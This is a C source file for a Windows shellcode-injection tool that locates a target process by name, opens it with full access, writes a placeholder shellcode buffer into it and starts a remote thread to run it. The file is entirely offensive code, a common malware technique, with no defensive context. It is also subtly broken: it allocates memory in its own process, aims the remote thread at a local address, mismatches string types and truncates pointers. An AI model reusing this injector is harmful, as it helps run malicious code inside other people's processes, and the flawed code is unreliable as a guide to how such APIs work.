#include <stdio.h>
#include <Windows.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "msvcrt.lib")

// The shellcode to be injected
unsigned char shellcode[] = "YOUR_SHELLCODE_HERE";

// Size of the shellcode
DWORD shellcode_size = sizeof(shellcode);

// Target process handle
HANDLE target_process;

// Allocate memory for shellcode in the target process
BOOL allocate_memory(HANDLE hProcess, DWORD* mem_addr) {
    HANDLE hMem;
    LPVOID lpMem;
    SIZE_T size = shellcode_size;

    hMem = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, size, NULL);
    if (hMem == INVALID_HANDLE_VALUE) {
        printf("CreateFileMapping failed.\n");
        return FALSE;
    }

    lpMem = MapViewOfFile(hMem, FILE_MAP_ALL_ACCESS, 0, 0, size);
    if (lpMem == NULL) {
        CloseHandle(hMem);
        printf("MapViewOfFile failed.\n");
        return FALSE;
    }

    *mem_addr = (DWORD)lpMem;

    return TRUE;
}

// Write the shellcode into allocated memory
BOOL write_shellcode(HANDLE hProcess, DWORD mem_addr) {
    DWORD written;

    WriteProcessMemory(hProcess, (LPVOID)mem_addr, shellcode, shellcode_size, &written);
    if (written != shellcode_size) {
        printf("WriteProcessMemory failed.\n");
        return FALSE;
    }

    return TRUE;
}

// Create remote thread to execute the shellcode
BOOL inject_shellcode(HANDLE hProcess, DWORD mem_addr) {
    HANDLE hThread;
    LPTHREAD_START_ROUTINE start_routine;
    start_routine = (LPTHREAD_START_ROUTINE)shellcode;

    hThread = CreateRemoteThread(hProcess, NULL, 0, start_routine, mem_addr, 0, NULL);
    if (hThread == INVALID_HANDLE_VALUE) {
        printf("CreateRemoteThread failed.\n");
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return TRUE;
}

// Find the target process by name
BOOL find_process(WCHAR* process_name) {
    HANDLE snapShot;
    PROCESSENTRY32 processInfo;
    snapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapShot == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot failed.\n");
        return FALSE;
    }

    processInfo.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapShot, &processInfo)) {
        CloseHandle(snapShot);
        printf("Process32First failed.\n");
        return FALSE;
    }

    do {
        if (wcscmp(processInfo.szExeFile, process_name) == 0) {
            target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processInfo.th32ProcessID);
            CloseHandle(snapShot);
            return TRUE;
        }
    } while (Process32Next(snapShot, &processInfo));

    CloseHandle(snapShot);
    return FALSE;
}

int main(int argc, char** argv) {
    DWORD mem_addr;
    BOOL success;

    if (argc < 2) {
        printf("Usage: %s <target_process_name> <shellcode>\n", argv[0]);
        return 1;
    }

    find_process(argv[1]);

    if (target_process == INVALID_HANDLE_VALUE) {
        printf("Failed to find the target process.\n");
        return 1;
    }

    success = allocate_memory(target_process, &mem_addr);
    if (!success) {
        CloseHandle(target_process);
        return 1;
    }

    success = write_shellcode(target_process, mem_addr);
    if (!success) {
        CloseHandle(target_process);
        return 1;
    }

    success = inject_shellcode(target_process, mem_addr);
    if (!success) {
        CloseHandle(target_process);
        return 1;
    }

    CloseHandle(target_process);

    printf("Shellcode injection succeeded.\n");
    return 0;
}
